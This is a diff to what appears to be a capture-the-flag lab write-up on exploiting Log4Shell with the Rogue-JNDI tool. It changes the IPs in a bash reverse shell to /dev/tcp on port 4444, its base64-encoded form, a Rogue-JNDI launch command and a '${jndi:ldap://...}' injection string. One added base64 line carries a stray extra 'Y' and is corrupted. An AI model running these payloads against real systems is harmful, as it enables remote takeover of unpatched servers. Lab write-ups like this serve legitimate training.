@@ -8,7 +8,7 @@
 ## Geting Started
 Use command to set Target IP
 ```bash
-IP=10.129.61.224 ; echo $IP
+IP=10.129.194.106 ; echo $IP
 ```
 
 Use command to set Target IP
@@ -284,25 +284,25 @@ mvn package
 To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding  issues.
 
 ```bash
-echo 'bash -c bash -i >&/dev/tcp/10.10.15.149/4444 0>&1' | base64
+echo 'bash -c bash -i >&/dev/tcp/10.10.15.30/4444 0>&1' | base64
 
-echo 'bash -c bash -i >&/dev/tcp/10.10.15.149/4444 0>&1' |  
-base64
 ```
 
 ```bash
-YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTQ5LzQ0NDQgMD4mMQo=
+YYmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMzAvNDQ0NCAwPiYxCg==
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMzAvNDQ0NCAwPiYxCg==
 ```
 
 After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of  the ``--command`` option and your ``tun0 IP`` address to the ``--hostname`` option
 
 ```bash
-java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTQ5LzQ0NDQgMD4mMQo=}| {base64,-d}|{bash,-i}" --hostname "10.10.15.149"
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMzAvNDQ0NCAwPiYxCg==}| {base64,-d}|{bash,-i}" --hostname "10.10.15.30"
+
 
 ```
 
 ```bash
-"remember":"${jndi:ldap://10.10.15.149:1389/o=tomcat}",
+"remember":"${jndi:ldap://10.10.15.30:1389/o=tomcat}",
 ```
 
 
